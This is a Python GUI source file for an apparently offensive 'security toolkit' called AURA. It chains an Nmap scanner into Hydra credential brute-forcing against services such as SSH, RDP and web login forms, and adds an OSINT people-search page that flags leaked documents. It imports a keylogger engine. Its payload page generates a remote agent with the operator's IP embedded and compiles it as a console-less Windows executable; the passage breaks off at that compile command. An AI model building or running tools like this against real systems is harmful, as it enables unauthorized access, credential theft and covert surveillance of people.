# AURA/security_toolkit.py

import os
import sys
import json
import re
import subprocess
import platform
import socket
import threading
import webbrowser
import requests
import tempfile
import uuid
from datetime import datetime
from core.sherlock import SherlockEngine
from PyQt6.QtCore import (
    Qt, QTimer, QTime, QSize, QLocale, QThread, pyqtSignal, QPropertyAnimation, QPoint, QEasingCurve, QTimer
)
from PyQt6.QtGui import (
    QFont, QIcon, QColor, QPalette, QBrush, QPixmap, QPainter, QRegion
)
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QLabel, QStackedWidget,
    QVBoxLayout, QHBoxLayout, QFrame, QPushButton, QSpacerItem,
    QSizePolicy, QLineEdit, QGroupBox, QScrollArea, QGraphicsDropShadowEffect,
    QMessageBox, QCheckBox, QSpinBox, QTextEdit, QGridLayout, QSpacerItem, 
    QSizePolicy, QFileDialog, QComboBox
)
from random import randint
from core.stress_test import StressTestExecutor
from core.components import (
    NeonCard, ConfigPage, 
    load_language_json, lang_get 
) 
from core import network_scanner 
from core.config import (
    THEMES, NEON_DEFAULT, load_user_settings,
    save_user_settings, ThemeManager 
)
from core.john_engine import JohnEngine
from core.hydra_engine import HydraWorker
from core.logger_engine import KeyloggerEngine

# --- 1. CLASSE WORKER (Para não congelar a UI durante o Nmap) ---
class ScannerWorker(QThread):
    finished = pyqtSignal(list)
    error = pyqtSignal(str)
    progress = pyqtSignal(str)

    def __init__(self, ip_targets: list):
        super().__init__()
        self.ip_targets = ip_targets

    def run(self):
        try:
            results = []
            total = len(self.ip_targets)

            for i, ip in enumerate(self.ip_targets, start=1):
                self.progress.emit(f"🔍 Escaneando {ip} ({i}/{total})")
                result = network_scanner.scan_single_target(ip)
                results.append(result)

            self.finished.emit(results)

        except Exception as e:
            self.error.emit(str(e))

# --- 2. CLASSE DA PÁGINA DE SCANNER ---
class ScannerPage(QWidget):
    def __init__(self, parent_window):
        super().__init__()
        self.parent_window = parent_window
        self.last_results = None
        self.vulnerable_targets = []
        self._setup_ui()

    def _setup_ui(self):
        layout = QVBoxLayout()
        layout.setContentsMargins(20, 20, 20, 20)

        self.ip_group = QGroupBox("Alvos de Varredura (IPs/Ranges)")
        self.ip_group.setObjectName("targets_group")

        ip_layout = QVBoxLayout()

        self.ip_input = QLineEdit()
        self.ip_input.setPlaceholderText(
            "Ex: 192.168.1.1, 10.0.0.0/24, 172.16.1.1-10"
        )
        ip_layout.addWidget(self.ip_input)

        self.start_button = QPushButton("Iniciar Varredura")
        self.start_button.clicked.connect(self.start_scan)
        ip_layout.addWidget(self.start_button)

        self.ip_group.setLayout(ip_layout)
        layout.addWidget(self.ip_group)

        scroll_area = QScrollArea()
        scroll_area.setWidgetResizable(True)

        self.result_group = QGroupBox("Resultados")
        self.result_group.setObjectName("results_group")
        result_layout = QVBoxLayout()

        self.results_text = QLabel("Aguardando varredura...")
        self.results_text.setWordWrap(True)
        self.results_text.setAlignment(
            Qt.AlignmentFlag.AlignTop | Qt.AlignmentFlag.AlignLeft
        )
        self.results_text.setSizePolicy(
            QSizePolicy.Policy.Preferred,
            QSizePolicy.Policy.MinimumExpanding
        )

        result_layout.addWidget(self.results_text)
        self.result_group.setLayout(result_layout)
        scroll_area.setWidget(self.result_group)
        layout.addWidget(scroll_area)

        self.save_button = QPushButton("Salvar Resultados no Logs/Relatórios")
        self.save_button.setEnabled(False)
        self.save_button.clicked.connect(self.save_results)
        layout.addWidget(self.save_button)

        self.send_hydra_button = QPushButton("Enviar IPs Vulneráveis para Hydra")
        self.send_hydra_button.setEnabled(False)
        self.send_hydra_button.clicked.connect(self.send_vulnerable_targets_to_hydra)
        layout.addWidget(self.send_hydra_button)

        layout.addStretch()
        self.setLayout(layout)

    def update_ui_language(self, L):
        self.ip_group.setTitle(lang_get(L, "scanner_page.targets_group", "Alvos de Varredura (IPs/Ranges)"))
        self.ip_input.setPlaceholderText(
            lang_get(L, "scanner_page.ip_placeholder", "Ex: 192.168.1.1, 10.0.0.0/24, etc.")
        )
        self.start_button.setText(lang_get(L, "scanner_page.start_scan", "Iniciar Varredura Nmap"))
        self.result_group.setTitle(lang_get(L, "scanner_page.results_group", "Resultados"))
        if self.results_text.text().strip() == "Aguardando varredura...":
            self.results_text.setText(lang_get(L, "scanner_page.awaiting_scan", "Aguardando varredura..."))
        self.save_button.setText(
            lang_get(L, "scanner_page.save_results", "Salvar Resultados no Logs/Relatórios")
        )

    def start_scan(self):
        ips_raw = self.ip_input.text()
        if not ips_raw.strip():
            self.results_text.setText("Por favor, insira pelo menos um IP ou range.")
            return

        ip_list = re.split(r"[,\s]+", ips_raw)
        ip_list = [ip.strip() for ip in ip_list if ip.strip()]

        if not ip_list:
            self.results_text.setText("Nenhum IP válido encontrado.")
            return

        self.start_button.setEnabled(False)
        self.save_button.setEnabled(False)

        self.results_text.setText(
            f"Iniciando varredura em {len(ip_list)} alvo(s)...<br>"
            f"<i>Isso pode demorar alguns minutos.</i>"
        )
        self.parent_window.status_label.setText("Varrendo rede...")

        self.worker = ScannerWorker(ip_list)
        self.worker.finished.connect(self.scan_finished)
        self.worker.progress.connect(self.update_progress)
        self.worker.error.connect(self.scan_error)
        self.worker.start()

    def update_progress(self, message):
        self.parent_window.status_label.setText(message)

    def scan_finished(self, results: list):
        self.last_results = results
        self.vulnerable_targets = []
        self.start_button.setEnabled(True)
        self.save_button.setEnabled(True)

        self.parent_window.status_label.setText("Varredura concluída ✔")

        display_text = "<b>✔ Varredura finalizada</b><br><br>"

        for host in results:
            if host.get("error"):
                display_text += (
                    f"<b>--- ERRO em {host.get('ip', 'N/A')} ---</b><br>"
                    f"{host['error']}<br><br>"
                )
                continue

            display_text += f"<b>--- IP: {host.get('ip', 'N/A')} ---</b><br>"

            os_name = host.get("os", "Unknown")
            if os_name == "Unknown":
                display_text += "<b>OS:</b> Unknown (requer privilégios de root)<br>"
            else:
                display_text += f"<b>OS:</b> {os_name}<br>"

            ports = host.get("open_ports", [])
            if ports:
                display_text += "<i>Portas Abertas:</i><br>"
                for p in ports:
                    display_text += (
                        f"&nbsp; - <b>{p['port']}/{p['protocol']}</b>: "
                        f"{p['service']}<br>"
                    )
            else:
                display_text += "Nenhuma porta aberta encontrada.<br>"

            vulns = host.get("vulnerabilities", [])
            if vulns:
                self.vulnerable_targets.append(host.get('ip', '').strip())
                display_text += "<i>Vulnerabilidades Potenciais:</i><br>"
                for i, v in enumerate(vulns):
                    if isinstance(v, dict):
                        details = str(v.get("details", ""))
                        port = v.get("port", "?")
                        script = v.get("script", "unknown")
                        v_short = details.replace("\n", " ").strip()
                        display_text += (
                            f"&nbsp; - <b>VULN {i+1}</b> "
                            f"(Port {port}, {script}): "
                            f"{v_short[:120]}...<br>"
                        )
                    else:
                        v_short = str(v).replace("\n", " ").strip()
                        display_text += (
                            f"&nbsp; - <b>VULN {i+1}</b>: "
                            f"{v_short[:120]}...<br>"
                        )

            display_text += "<br>"

        self.results_text.setText(display_text)
        self.send_hydra_button.setEnabled(bool(self.vulnerable_targets))

    def scan_error(self, message):
        self.start_button.setEnabled(True)
        self.parent_window.status_label.setText("Erro durante varredura ❌")
        self.results_text.setText(
            f"Um erro inesperado ocorreu:<br><b>{message}</b><br>"
            "Verifique se o Nmap está instalado e se você tem permissões de sudo."
        )
        self.last_results = None
        self.send_hydra_button.setEnabled(False)

    def save_results(self):
        if not self.last_results:
            return

        log_dir = os.path.join(self.parent_window.base_dir, "logs")
        os.makedirs(log_dir, exist_ok=True)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(log_dir, f"scan_report_{timestamp}.json")

        try:
            network_scanner.save_json(self.last_results, filename)

            self.parent_window.status_label.setText(
                f"Relatório salvo em logs/{os.path.basename(filename)} ✔"
            )
            self.save_button.setEnabled(False)

        except Exception as e:
            self.parent_window.status_label.setText(
                f"Falha ao salvar relatório: {type(e).__name__}"
            )
            print("ERRO AO SALVAR RELATÓRIO:", e)

    def send_vulnerable_targets_to_hydra(self):
        targets = [ip for ip in self.vulnerable_targets if ip]
        if not targets:
            QMessageBox.information(self, "Hydra", "Nenhum IP com vulnerabilidade disponível para enviar.")
            return
        self.parent_window.open_hydra_with_targets(targets)


# --- CLASSE WORKER PARA O SHERLOCK ---
class SherlockWorker(QThread):
    result_found = pyqtSignal(str, str)
    finished = pyqtSignal(list)

    def __init__(self, target, mode):
        super().__init__()
        self.target = target
        self.mode = mode
        self.engine = SherlockEngine()

    def run(self):
        # Passa o alvo e o modo para o motor
        results = self.engine.search_everywhere(self.target, mode=self.mode, callback=self.result_found.emit)
        self.finished.emit(results)

# --- CLASSE DA INTERFACE DO SHERLOCK ---
class SherlockPage(QWidget):
    def __init__(self, parent_window):
        super().__init__()
        self.parent_window = parent_window
        self._setup_ui()

    def _setup_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(30, 30, 30, 30)

        # Título e Subtítulo
        title = QLabel("🔍 Sherlock OSINT Pro")
        title.setFont(QFont("Arial", 22, QFont.Weight.Bold))
        layout.addWidget(title)

        subtitle = QLabel("Busca avançada por Nickname, Nome Completo e Vazamentos.")
        subtitle.setStyleSheet("color: #888; margin-bottom: 10px;")
        layout.addWidget(subtitle)

        # --- SELETOR DE MODO ---
        mode_container = QHBoxLayout()
        mode_label = QLabel("Tipo de Alvo:")
        mode_label.setStyleSheet("color: white; font-weight: bold;")
        
        self.mode_selector = QComboBox()
        self.mode_selector.addItems(["Nickname", "Nome Completo"])
        self.mode_selector.setCursor(Qt.CursorShape.PointingHandCursor)
        self.mode_selector.setStyleSheet("""
            QComboBox {
                background: #1a1a1a; 
                color: #0f0; 
                border: 1px solid #0f0; 
                padding: 5px 15px; 
                border-radius: 5px;
                min-width: 150px;
            }
            QComboBox QAbstractItemView {
                background-color: #1a1a1a;
                color: #0f0;
                selection-background-color: #0f0;
                selection-color: #000;
            }
        """)
        mode_container.addWidget(mode_label)
        mode_container.addWidget(self.mode_selector)
        mode_container.addStretch() # Empurra tudo para a esquerda
        layout.addLayout(mode_container)

        # --- CONTAINER DE BUSCA ---
        search_box = QFrame()
        search_box.setStyleSheet("background: #1a1a1a; border-radius: 10px; padding: 5px; border: 1px solid #333;")
        search_layout = QHBoxLayout(search_box)

        self.user_input = QLineEdit()
        self.user_input.setPlaceholderText("Digite o alvo aqui...")
        self.user_input.setStyleSheet("border: none; background: transparent; padding: 10px; font-size: 16px; color: white;")
        
        self.btn_investigate = QPushButton("INVESTIGAR")
        self.btn_investigate.setCursor(Qt.CursorShape.PointingHandCursor)
        neon = self.parent_window.theme_manager.neon_color
        self.btn_investigate.setStyleSheet(f"""
            QPushButton {{
                background-color: transparent; border: 2px solid {neon};
                color: {neon}; padding: 10px 25px; border-radius: 5px; font-weight: bold;
            }}
            QPushButton:hover {{ background-color: {neon}; color: #000; }}
            QPushButton:disabled {{ border-color: #555; color: #555; }}
        """)
        self.btn_investigate.clicked.connect(self.run_sherlock)

        search_layout.addWidget(self.user_input)
        search_layout.addWidget(self.btn_investigate)
        layout.addWidget(search_box)

        # --- ÁREA DE RESULTADOS ---
        self.scroll = QScrollArea()
        self.scroll.setWidgetResizable(True)
        self.scroll.setStyleSheet("border: none; background: transparent; margin-top: 10px;")
        self.results_container = QWidget()
        self.results_layout = QVBoxLayout(self.results_container)
        self.results_layout.setAlignment(Qt.AlignmentFlag.AlignTop)
        self.scroll.setWidget(self.results_container)
        layout.addWidget(self.scroll)

    def run_sherlock(self):
        target = self.user_input.text().strip()
        if not target: return

        # Traduz o que está no combo box para o que o motor entende
        # 0 é Nickname, 1 é Nome Completo
        mode = "nickname" if self.mode_selector.currentIndex() == 0 else "full_name"

        # Limpa resultados anteriores
        for i in reversed(range(self.results_layout.count())): 
            widget = self.results_layout.itemAt(i).widget()
            if widget:
                widget.setParent(None)

        self.btn_investigate.setEnabled(False)
        self.btn_investigate.setText("BUSCANDO...")
        
        # CHAMA A THREAD (Aqui estava o erro: agora passamos target e mode)
        self.thread = SherlockWorker(target, mode)
        self.thread.result_found.connect(self.add_result_card)
        self.thread.finished.connect(lambda res: self.finalize_search(target, res))
        self.thread.start()

    def finalize_search(self, username, results):
        self.btn_investigate.setEnabled(True)
        self.btn_investigate.setText("INVESTIGAR")
        
        if results:
            # Salva o arquivo e pega o caminho completo
            path = SherlockEngine().save_to_json(username, results, self.parent_window.base_dir)
            filename = os.path.basename(path)
            
            # Atualiza o status na barra inferior
            self.parent_window.status_label.setText(f"Relatório salvo: {filename}")
            
            # MOSTRA A MENSAGEM DE SUCESSO (Pop-up)
            msg = QMessageBox(self)
            msg.setWindowTitle("Busca Finalizada")
            msg.setIcon(QMessageBox.Icon.Information)
            msg.setText(f"A investigação de '{username}' foi concluída!")
            msg.setInformativeText(f"O arquivo foi gerado com sucesso em:\n\n{path}")
            
            # Estilização rápida do pop-up para combinar com o tema escuro
            msg.setStyleSheet("""
                QMessageBox { background-color: #1a1a1a; }
                QLabel { color: white; }
                QPushButton { 
                    background-color: #333; color: white; 
                    padding: 5px 15px; border-radius: 3px; 
                }
            """)
            msg.exec()
            
        else:
            self.parent_window.status_label.setText("Nenhum resultado encontrado.")
            QMessageBox.warning(self, "Aviso", "Nenhuma rede social encontrada para este username.")

    def add_result_card(self, site, url):
        card = QFrame()
        
        # Mapeamento de cores OSINT
        # Isso ajuda o auditor a identificar vazamentos e documentos rapidamente
        color_map = {
            "DuckDuckGo": "#ff8c00",       # Laranja para busca global
            "OSINT-Search": "#ff8c00",
            "Webmii": "#00ced1",           # Azul claro para people search
            "PeekYou": "#00ced1",
            "TruePeople": "#00ced1",
            "📄 Documento": "#ff4444",     # Vermelho para possíveis vazamentos/PDFs
            "Potential Leak/Doc": "#ff4444",
            "Gravatar": "#da70d6"          # Roxo para perfis com fotos/identidade
        }
        
        # Se o site não estiver no mapa, usa a cor neon padrão do sistema
        neon = self.parent_window.theme_manager.neon_color
        border_color = color_map.get(site, neon)
        
        card.setStyleSheet(f"""
            QFrame {{
                background: #222; 
                border-left: 5px solid {border_color}; 
                border-radius: 5px; 
                margin-bottom: 8px;
                padding: 10px;
            }}
            QFrame:hover {{
                background: #2a2a2a;
            }}
        """)
        
        l = QHBoxLayout(card)
        
        # Formatação do texto
        display_url = (url[:65] + '...') if len(url) > 65 else url
        label_text = f"""
            <div style='color: white;'>
                <b style='font-size: 14px;'>{site}</b><br>
                <span style='color: #888; font-size: 12px;'>{display_url}</span>
            </div>
        """
        
        info_label = QLabel(label_text)
        l.addWidget(info_label)
        
        l.addStretch()
        
        # Botão Abrir
        btn = QPushButton("VISUALIZAR")
        btn.setCursor(Qt.CursorShape.PointingHandCursor)
        btn.setFixedWidth(100)
        btn.setStyleSheet(f"""
            QPushButton {{
                background: #333; color: white; border-radius: 3px; padding: 5px; font-size: 11px;
            }}
            QPushButton:hover {{ background: #444; color: {border_color}; }}
        """)
        btn.clicked.connect(lambda: webbrowser.open(url))
        l.addWidget(btn)
        
        self.results_layout.insertWidget(0, card) # Adiciona os novos no topo

# --- Hydra ---
class HydraPage(QWidget):
    def __init__(self, parent_window):
        super().__init__()
        self.parent_window = parent_window
        self.user_list_path = ""
        self.pass_list_path = ""
        self.targets_file = None
        self.worker = None

        scroll = QScrollArea(self)
        scroll.setWidgetResizable(True)

        container = QWidget()
        self.main_layout = QVBoxLayout(container)

        scroll.setWidget(container)

        outer_layout = QVBoxLayout(self)
        outer_layout.addWidget(scroll)

        self._setup_ui()

    # ===============================
    # UI
    # ===============================
    def _setup_ui(self):
        layout = self.main_layout
        layout.setContentsMargins(30, 30, 30, 30)
        layout.setSpacing(15)

        title = QLabel("🧰 Hydra - Teste de Credenciais")
        title.setFont(QFont("Arial", 22, QFont.Weight.Bold))
        layout.addWidget(title)

        warning = QLabel("⚠️ Use somente em ambientes autorizados.")
        warning.setStyleSheet("color: #ffaa00; font-weight: bold;")
        layout.addWidget(warning)

        # -------- Targets --------
        targets_group = QGroupBox("Alvos")
        targets_layout = QVBoxLayout()
        self.targets_input = QTextEdit()
        self.targets_input.setPlaceholderText("Ex: 192.168.0.10\n192.168.0.20")
        self.targets_input.setFixedHeight(80)
        targets_layout.addWidget(self.targets_input)
        targets_group.setLayout(targets_layout)
        layout.addWidget(targets_group)

        # -------- Service --------
        service_group = QGroupBox("Serviço e Porta")
        service_layout = QHBoxLayout()

        self.service_combo = QComboBox()
        self.service_combo.setEditable(True)
        self.service_combo.addItems([
            "ssh", "ftp", "telnet", "smb", "rdp",
            "http-get", "http-post-form",
            "mysql", "postgres", "vnc"
        ])
        self.service_combo.currentTextChanged.connect(self._on_service_changed)

        self.port_input = QSpinBox()
        self.port_input.setRange(0, 65535)
        self.port_input.setValue(0)

        service_layout.addWidget(QLabel("Serviço:"))
        service_layout.addWidget(self.service_combo, 2)
        service_layout.addWidget(QLabel("Porta:"))
        service_layout.addWidget(self.port_input, 1)

        service_group.setLayout(service_layout)
        layout.addWidget(service_group)

        # -------- HTTP POST FORM --------
        self.http_group = QGroupBox("Configuração HTTP POST")
        self.http_group.setVisible(False)

        http_layout = QVBoxLayout()

        self.http_path = QLineEdit()
        self.http_path.setPlaceholderText("/login.php")

        self.http_params = QLineEdit()
        self.http_params.setPlaceholderText("username=^USER^&password=^PASS^")

        self.http_fail = QLineEdit()
        self.http_fail.setPlaceholderText("Texto de falha (ex: Invalid login)")

        http_layout.addWidget(QLabel("Caminho do formulário"))
        http_layout.addWidget(self.http_path)
        http_layout.addWidget(QLabel("Parâmetros POST"))
        http_layout.addWidget(self.http_params)
        http_layout.addWidget(QLabel("String de falha"))
        http_layout.addWidget(self.http_fail)

        self.http_group.setLayout(http_layout)
        layout.addWidget(self.http_group)

        # -------- Credentials --------
        creds_group = QGroupBox("Credenciais")
        creds_layout = QVBoxLayout()

        user_row = QHBoxLayout()
        self.user_input = QLineEdit()
        self.user_input.setPlaceholderText("Usuário único")
        self.user_list_button = QPushButton("Lista de Usuários")
        self.user_list_button.clicked.connect(self.select_user_list)
        user_row.addWidget(self.user_input, 2)
        user_row.addWidget(self.user_list_button, 1)

        pass_row = QHBoxLayout()
        self.pass_input = QLineEdit()
        self.pass_input.setPlaceholderText("Senha única")
        self.pass_list_button = QPushButton("Lista de Senhas")
        self.pass_list_button.clicked.connect(self.select_pass_list)
        pass_row.addWidget(self.pass_input, 2)
        pass_row.addWidget(self.pass_list_button, 1)

        creds_layout.addLayout(user_row)
        creds_layout.addLayout(pass_row)
        creds_group.setLayout(creds_layout)
        layout.addWidget(creds_group)

        # -------- Options --------
        options_group = QGroupBox("Opções")
        options_layout = QHBoxLayout()

        self.tasks_input = QSpinBox()
        self.tasks_input.setRange(1, 64)
        self.tasks_input.setValue(4)

        self.stop_on_success = QCheckBox("Parar ao encontrar credencial")
        self.verbose_check = QCheckBox("Verbose")

        options_layout.addWidget(QLabel("Threads (-t):"))
        options_layout.addWidget(self.tasks_input)
        options_layout.addWidget(self.stop_on_success)
        options_layout.addWidget(self.verbose_check)

        options_group.setLayout(options_layout)
        layout.addWidget(options_group)

        # -------- Buttons --------
        button_row = QHBoxLayout()

        self.start_button = QPushButton("INICIAR")
        self.start_button.clicked.connect(self.start_hydra)

        self.stop_button = QPushButton("PARAR")
        self.stop_button.setEnabled(False)
        self.stop_button.clicked.connect(self.stop_hydra)

        button_row.addWidget(self.start_button)
        button_row.addWidget(self.stop_button)
        layout.addLayout(button_row)

        # -------- Console --------
        self.console = QTextEdit()
        self.console.setReadOnly(True)
        self.console.setStyleSheet(
            "background:#000;color:#0f0;font-family:Courier New;"
        )
        layout.addWidget(self.console)

    # ===============================
    # Helpers
    # ===============================
    def _on_service_changed(self, service):
        self.http_group.setVisible(service.strip() == "http-post-form")

    def _parse_targets(self):
        raw = self.targets_input.toPlainText()
        return [t.strip() for t in re.split(r"[,\s]+", raw) if t.strip()]

    def _write_targets_file(self, targets):
        tmp = tempfile.NamedTemporaryFile(
            delete=False, mode="w", encoding="utf-8", suffix=".txt"
        )
        tmp.write("\n".join(targets))
        tmp.close()
        return tmp.name

    def select_user_list(self):
        file, _ = QFileDialog.getOpenFileName(self, "Lista de Usuários", "", "*.txt")
        if file:
            self.user_list_path = file
            self.user_list_button.setText(os.path.basename(file))

    def select_pass_list(self):
        file, _ = QFileDialog.getOpenFileName(self, "Lista de Senhas", "", "*.txt")
        if file:
            self.pass_list_path = file
            self.pass_list_button.setText(os.path.basename(file))

    # ===============================
    # Hydra
    # ===============================
    def start_hydra(self):
        self.hydra_start_time = datetime.now()
        if self.worker:
            QMessageBox.information(self, "Hydra", "Já existe uma execução em andamento.")
            return

        targets = self._parse_targets()
        if not targets:
            QMessageBox.warning(self, "Hydra", "Informe ao menos um alvo.")
            return

        service = self.service_combo.currentText().strip()
        if not service:
            QMessageBox.warning(self, "Hydra", "Informe o serviço.")
            return

        if service == "http-post-form":
            if not all([
                self.http_path.text().strip(),
                self.http_params.text().strip(),
                self.http_fail.text().strip()
            ]):
                QMessageBox.warning(self, "Hydra", "Preencha todos os campos do HTTP POST.")
                return
            if "^USER^" not in self.http_params.text() and "^PASS^" not in self.http_params.text():
                QMessageBox.warning(self, "Hydra", "Use ^USER^ e ^PASS^ nos parâmetros.")
                return

        self.targets_file = None
        if len(targets) > 1:
            self.targets_file = self._write_targets_file(targets)

        self.console.clear()
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)

        self.worker = HydraWorker(
            targets=targets,
            service=service,
            username=self.user_input.text().strip(),
            password=self.pass_input.text().strip(),
            user_list=self.user_list_path,
            pass_list=self.pass_list_path,
            port=self.port_input.value(),
            tasks=self.tasks_input.value(),
            stop_on_success=self.stop_on_success.isChecked(),
            verbose=self.verbose_check.isChecked(),
            targets_file=self.targets_file,
            http_path=self.http_path.text().strip(),
            http_params=self.http_params.text().strip(),
            http_fail=self.http_fail.text().strip(),
        )

        self.current_targets = targets
        self.current_service = service
        self.current_port = self.port_input.value()
        self.current_attack_type = "single" if self.user_input.text() and self.pass_input.text() else "wordlist"
        self.worker.output_line.connect(self.console.append)
        self.worker.error.connect(self.console.append)
        self.worker.finished.connect(self.finish_hydra)
        self.worker.finished.connect(self.worker.deleteLater)

        self.worker.start()

    def stop_hydra(self):
        if self.worker:
            self.worker.stop()
            self.console.append("[INFO] Interrupção solicitada.")
        self.stop_button.setEnabled(False)

    def finish_hydra(self, code):
        success = (code == 0)

        self.console.append(f"[INFO] Hydra finalizado com código {code}.")

        found_creds = None
        if success:
            found_creds = {
                "username": self.user_input.text().strip(),
                "password": self.pass_input.text().strip(),
            }

        self._save_hydra_log(success, found_creds)

        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.worker = None


    def _save_hydra_log(self, success, found_creds=None):
        log_dir = os.path.join(self.parent_window.base_dir, "logs")
        os.makedirs(log_dir, exist_ok=True)

        duration = None
        if hasattr(self, "hydra_start_time"):
            duration = (datetime.now() - self.hydra_start_time).total_seconds()

        now = datetime.now()
        filename = f"hydra_{now.strftime('%Y-%m-%d_%H-%M-%S')}.json"
        filepath = os.path.join(log_dir, filename)

        log_data = {
            "attack_id": str(uuid.uuid4()),
            "tool": "Hydra",
            "timestamp": now.isoformat(),
            "duration_seconds": duration,
            "targets": getattr(self, "current_targets", []),
            "service": getattr(self, "current_service", ""),
            "port": getattr(self, "current_port", 0),
            "attack_type": getattr(self, "current_attack_type", "unknown"),
            "severity": "HIGH" if success else "INFO",
            "success": success,
            "credentials_found": found_creds if success else None,
            "evidence": "Valid credentials found" if success else "No credentials found"
        }

        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(log_data, f, indent=4, ensure_ascii=False)

        self.console.append(f"[INFO] Log salvo em {filepath}")


# --- BRUTE FORCE ---
class FirewallPage(QWidget):
    def __init__(self, parent_window):
        super().__init__()
        self.parent_window = parent_window
        self.L = parent_window.L
        self._setup_ui()

    def _setup_ui(self):
        layout = QVBoxLayout()
        layout.setContentsMargins(30, 30, 30, 30)
        layout.setSpacing(20)

        title_label = QLabel("🛡️ Teste de Firewall e Acesso Remoto")
        title_label.setFont(QFont("Arial", 18, QFont.Weight.Bold))
        layout.addWidget(title_label)

        desc_text = (
            "Este teste valida as permissões de execução do sistema e a capacidade de "
            "interação com o usuário. Ele verifica se o ambiente bloqueia scripts externos "
            "ou diálogos de segurança, simulando o comportamento de ferramentas de monitoramento."
        )
        description = QLabel(desc_text)
        description.setWordWrap(True)
        description.setStyleSheet(f"color: {THEMES['dark']['text_secondary']};")
        layout.addWidget(description)

        action_group = QGroupBox("Execução do Teste")
        action_layout = QVBoxLayout()
        
        self.btn_local = QPushButton("Iniciar no Computador Local")
        self.btn_local.setFixedHeight(45)
        self.btn_local.setCursor(Qt.CursorShape.PointingHandCursor)
        self.btn_local.clicked.connect(self.run_local_test)
        
        self.btn_remote = QPushButton("Iniciar em Host Remoto (Em breve)")
        self.btn_remote.setFixedHeight(45)
        self.btn_remote.setEnabled(True)
        self.btn_remote.clicked.connect(lambda: self.parent_window.pages.setCurrentIndex(7)) 
        
        action_layout.addWidget(self.btn_local)
        action_layout.addWidget(self.btn_remote)
        action_group.setLayout(action_layout)
        layout.addWidget(action_group)

        self.log_output = QLabel("Aguardando comando...")
        self.log_output.setStyleSheet("""
            background-color: #050505; 
            border: 1px solid #2a2a2a; 
            padding: 10px; 
            font-family: 'Consolas';
        """)
        self.log_output.setAlignment(Qt.AlignmentFlag.AlignTop)
        self.log_output.setWordWrap(True)
        layout.addWidget(self.log_output)

        layout.addStretch()
        self.setLayout(layout)

    def run_local_test(self):
        """Executa o teste e lida com a interface."""
        try:
            from core.interaction_test import run_interaction_test
            
            self.btn_local.setEnabled(False)
            self.btn_local.setText("Teste em Andamento...")
            self.log_output.setText("<b>[INFO]</b> O teste de interação foi iniciado.")
            
            run_interaction_test(self.parent_window)
            
            self.btn_local.setEnabled(True)
            self.btn_local.setText("Iniciar no Computador Local")
            
            log_path = os.path.join(self.parent_window.base_dir, "logs", "teste_interacao.log")
            self.update_log_view(log_path)
            
        except Exception as e:
            self.btn_local.setEnabled(True)
            self.btn_local.setText("Iniciar no Computador Local")
            self.log_output.setText(f"<b>[ERRO]</b>: {e}")

    def update_log_view(self, path):
        try:
            if os.path.exists(path):
                with open(path, "r", encoding="utf-8") as f:
                    content = f.read()
                    self.log_output.setText(f"<pre>{content[-500:]}</pre>")
            else:
                self.log_output.setText("<b>[INFO]</b> Teste concluído, mas o arquivo de log não foi gerado.")
        except Exception as e:
            self.log_output.setText(f"<b>[ERRO]</b> ao ler log: {e}")

    def update_ui_language(self, L):
        self.L = L

# --- PAGINA DO AGENTE ---
class PayloadPage(QWidget):
    def __init__(self, parent_window):
        super().__init__()
        self.parent_window = parent_window
        self._setup_ui()

    def _setup_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(30, 30, 30, 30)
        layout.setSpacing(20)

        title = QLabel("📦 Gerador de Agente Remoto (Payload)")
        title.setFont(QFont("Arial", 18, QFont.Weight.Bold))
        layout.addWidget(title)

        desc = QLabel("Selecione o sistema operacional do computador alvo para gerar o agente de conexão.")
        desc.setStyleSheet("color: #aaaaaa;")
        layout.addWidget(desc)

        self.btn_win = QPushButton("🪟 Gerar Agente para Windows (.exe)")
        self.btn_win.setFixedHeight(50)
        self.btn_win.setCursor(Qt.CursorShape.PointingHandCursor)
        self.btn_win.clicked.connect(lambda: self.generate_payload("windows"))

        self.btn_lin = QPushButton("🐧 Gerar Agente para Linux (.py)")
        self.btn_lin.setFixedHeight(50)
        self.btn_lin.setCursor(Qt.CursorShape.PointingHandCursor)
        self.btn_lin.clicked.connect(lambda: self.generate_payload("linux"))

        self.btn_go_listener = QPushButton("Ir para Painel de Controle 📡")
        self.btn_go_listener.clicked.connect(lambda: self.parent_window.pages.setCurrentIndex(8))
        layout.addWidget(self.btn_go_listener)

        layout.addWidget(self.btn_win)
        layout.addWidget(self.btn_lin)

        self.status_log = QLabel("Aguardando seleção...")
        self.status_log.setStyleSheet("background: #111; padding: 10px; border: 1px solid #333;")
        layout.addWidget(self.status_log)

        layout.addStretch()
        
        btn_back = QPushButton("⬅ Voltar")
        btn_back.clicked.connect(lambda: self.parent_window.pages.setCurrentIndex(6))
        layout.addWidget(btn_back)

    def generate_payload(self, os_type):
        import socket
        import subprocess
        
        try:
            s_temp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s_temp.connect(("8.8.8.8", 80))
            my_ip = s_temp.getsockname()[0]
            s_temp.close()
        except:
            my_ip = "127.0.0.1"

        self.status_log.setText(f"<b>[INFO]</b> Gerando agente para {os_type} (IP: {my_ip})...")
        QApplication.processEvents()

        try:
            payload_dir = os.path.join(self.parent_window.base_dir, "logs", "payloads")
            os.makedirs(payload_dir, exist_ok=True)
            
            agent_template_path = os.path.join(self.parent_window.base_dir, "core", "aura_agent.py")
            
            if not os.path.exists(agent_template_path):
                self.status_log.setText("<b>[ERRO]</b> Arquivo 'core/aura_agent.py' não encontrado!")
                return

            with open(agent_template_path, "r", encoding="utf-8") as f:
                content = f.read()

            content = content.replace('###IP_CONFIG###', my_ip)

            if os_type == "linux":
                output_file = os.path.join(payload_dir, "aura_agent_linux.py")
                with open(output_file, "w", encoding="utf-8") as f:
                    f.write(content)
                self.status_log.setText(f"<b>[SUCESSO]</b> Agente Linux pronto em: <br>{output_file}")
                pass

            elif os_type == "windows":
                temp_py = os.path.join(payload_dir, "temp_win_agent.py")
                with open(temp_py, "w", encoding="utf-8") as f:
                    f.write(content)
                
                self.status_log.setText("<b>[INFO]</b> Compilando EXE... Aguarde.")
                QApplication.processEvents()

                import sys
                cmd = f'"{sys.executable}" -m PyInstaller --onefile --noconsole --noconfirm --distpath "{payload_dir}" "{temp_py}"'
                
